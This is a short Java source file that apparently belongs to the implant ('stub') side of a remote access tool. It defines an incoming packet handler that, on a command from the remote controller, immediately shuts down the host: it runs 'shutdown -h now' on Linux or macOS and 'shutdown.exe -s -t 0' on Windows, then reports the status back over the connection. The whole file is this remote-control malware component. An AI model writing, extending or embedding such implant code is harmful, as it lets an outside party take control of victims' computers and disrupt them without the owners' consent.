package com.redpois0n.stub.packets.incoming;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Constants;

public class Packet28ShutdownComputer extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
			Runtime.getRuntime().exec("shutdown -h now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -s -t 0");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
